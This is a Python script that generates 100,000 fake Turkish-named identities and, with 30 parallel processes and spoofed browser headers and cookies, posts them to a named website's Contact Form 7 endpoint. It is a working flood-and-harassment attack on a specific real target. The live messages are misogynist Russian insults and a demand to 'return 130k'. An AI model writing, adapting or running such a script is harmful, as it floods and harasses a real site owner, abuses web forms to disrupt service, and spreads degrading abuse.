import random
import json
import requests
from multiprocessing import Pool


# PRIVET KRAKENU OT GEKSCHATA


def fakePerson():
    result = {}
    firstName = [
        'Mehmet', 'Mustafa', 'Ahmet', 'Ali', 'Husein', 'Hasan', 'Ibrahim',
        'Ismail', 'Osman', 'Halil', 'Abdullah', 'Mahmud', 'Salik', 'Kamal',
        'Erkan'
    ]
    lastName = [
        'Yilmaz', 'Kaya', 'Demir', 'Shahin', 'Celik', 'Yildiz', 'Yildirim',
        'Ozctyurk', 'Aidin', 'Dogan', 'Kyuluc', 'Aslan', 'Cetin', 'Kara',
        'Koc'
    ]
    email = '@gmail.com'
    msgs = [
        # 'Allah dağına göre kar verir.',
        # 'Ahmet almadı, Mehmet te vermedi.',
        # 'Koça boynuzu yük değil.',
        # 'Kaza geliyorum demez.',
        # 'Hırsızlık bir ekmekten, kahpelik bir öpmekten.',
        # 'Karga kekliği taklit edeyim derken kendi yürüyüşünü şaşırmış.',
        # 'İki cambaz bir ipte oynamaz.',
        # 'İki koç kafası bir kazanda kaynamaz.',
        # 'Yaza çıkardık danayı, beğenmez oldu anayı.',
        # 'Merhaba, bir iş teklifi var. Bana bir e-posta yaz.',
        'Ку шлюха. Привет от чатика',
        'Кстати иди нахуй.',
        'Верни 130к сука.',
        'Наш искуственный интелект задетектил шлюху. Вот же она.',
        'Как делы, собака сутулая',
        'На то и бл:::дь, чтоб употреблять.',
        'ну она спортсменка комсомолка..... индивидуалка',
        'Я не шлюха, я — жертва страсти!',
        'Мечта шлюхи о свободе - это мечта самой выбирать и клиентов и сутенеров.',
        'Парадокс. Если девушка делится собою со всеми, то её называют - плохими словами.',
    ]
    phoneCodes = [
        '472', '322', '416', '256', '382', '358', '312', '242', '478', '466',
        '272', '458', '266', '378', '488', '228', '426', '434', '374', '248',
        '224', '432', '342', '454', '456', '258', '412', '380', '372', '476',
        '232'
    ]
    result['your-name'] = random.choice(firstName) + ' ' + random.choice(
        lastName)
    result['your-email'] = (random.choice(firstName) + random.choice(lastName) +
                            email)
    result['tel-38'] = '+90' + random.choice(phoneCodes) + str(random.randint(
        0000000, 9999999))
    result['your-message'] = random.choice(msgs)
    result['_wpcf7'] = 50
    result['_wpcf7_version'] = '5.1.6'
    result['_wpcf7_locale'] = 'en_US'
    result['_wpcf7_unit_tag'] = 'wpcf7-f50-o1'
    result['_wpcf7_container_post'] = 0
    return json.dumps(result)


def getArrData():
    arr = []
    while len(arr) < 100000:
        arr.append(fakePerson())
    return arr


def yaNavojuNaVasGipnoz(data):
    dictData = json.loads(data)
    cookie = {
        '__cfduid': 'd73735d5972aa336cbebe3a2432cc8d731614684500',
        'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
        'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
        'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
        'tk_rl': '%22%22',
        'tk_ro': '%22%22',
        'tk_tc': ''
    }
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru',
        'content-length': '1029',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarywQHiOkKiMMSvhXtP',
        'cookie': '__cfduid=d5af44aa6ba73eeb73fd2c7eb3b1541181614595064; '
                  'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22%22',
        'origin': 'https://justhotfight.com',
        'referer': 'https://justhotfight.com/contact/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)   Gecko/20100101 Firefox/69.0',
        'x-requested-with': 'XMLHttpRequest'

    }
    url = 'https://justhotfight.com/wp-json/contact-form-7/v1/contact-forms/50/feedback'
    try:
        r = requests.post(url, headers=headers, json=data, stream=True)
        code = r.status_code
        if code == 200:
            print('Отправлено! ' + ' <|> ' + str(dictData['your-message']))
        else:
            print('Мы в дерьме')
    except requests.exceptions.HTTPError as errh:
        print("Http Error:", errh)
    except requests.exceptions.ConnectionError as errc:
        print("Error Connecting:", errc)
    except requests.exceptions.Timeout as errt:
        print("Timeout Error:", errt)
    except requests.exceptions.RequestException as err:
        print("OOps: Something Else", err)


if __name__ == '__main__':
    # checkFakePersonJSON
    # print(fakePerson())

    with Pool(30) as pool:
        pool.map(yaNavojuNaVasGipnoz, getArrData())
    # cnt = 0
    # while cnt < 1000:
    #     yaNavojuNaVasGipnoz(fakePerson())
    #     cnt += 1
        # print(str(cnt) + ' запросов отправлено.')
